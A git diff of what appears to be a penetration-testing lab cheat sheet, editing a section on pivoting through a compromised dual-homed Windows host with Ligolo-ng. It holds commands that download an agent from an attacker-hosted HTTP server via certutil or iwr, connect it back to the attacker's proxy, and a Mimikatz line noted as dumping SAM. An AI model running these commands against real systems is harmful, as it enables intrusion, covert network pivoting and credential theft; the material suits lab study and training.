@@ -662,30 +662,6 @@ lsadump::lsa /patch #both these dump SAM
 
 ```
 
-## Ligolo-ng
-
-```powershell
-#Creating interface and starting it.
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-
-#Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
-
-#windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
-
-#In Ligolo-ng console
-session #select host
-ifconfig #Notedown the internal network's subnet
-start #after adding relevent subnet to ligolo interface
-
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
-
-```
-
----
 
 # Recon and Enumeration
 
@@ -2157,19 +2133,13 @@ Do **not** create another interface.
 On Kali:
 
 ```bash
-ligolo-proxy -selfcert
+sudo ligolo-proxy -selfcert
 ```
 
 The agent will connect to:
 
 ```text
 KALI_IP:11601
-```
-
-For this lab:
-
-```text
-192.168.45.227:11601
 ```
 
 Verify from another Kali terminal:
@@ -2193,14 +2163,10 @@ python3 -m http.server 8000
 
 The Windows agent is now available from the lab pivot at:
 
-```text
-http://192.168.45.227:8000/ligolo-ng_agent_amd64.exe
-```
-
 On the Windows pivot:
 
 ```powershell
-iwr http://192.168.45.227:8000/ligolo-ng_agent_amd64.exe -OutFile C:\Windows\Temp\agent.exe
+certutil -urlcache -split -f "http://KALI_IP:8000/ligolo-ng_agent_amd64.exe" C:\Windows\Temp\agent.exe
 ```
 
 Verify:
@@ -2223,8 +2189,8 @@ route print
 For this machine, `route print` showed:
 
 ```text
-192.168.173.141/24
-10.10.173.141/24
+192.168.173.141/24 #Pivot IP
+10.10.173.141/24 #Internal
 ```
 
 And:
@@ -2263,20 +2229,20 @@ The pivot machine is **dual-homed**:
 On Windows:
 
 ```powershell
-C:\Windows\Temp\agent.exe -connect 192.168.45.227:11601 -ignore-cert
+C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
 ```
 
 Or:
 
 ```powershell
 cd C:\Windows\Temp
-.\agent.exe -connect 192.168.45.227:11601 -ignore-cert
+.\agent.exe -connect KALI_IP:11601 -ignore-cert
 ```
 
 Because the Kali proxy was started using:
 
 ```bash
-ligolo-proxy -selfcert
+sudo ligolo-proxy -selfcert
 ```
 
 the disposable lab setup uses:
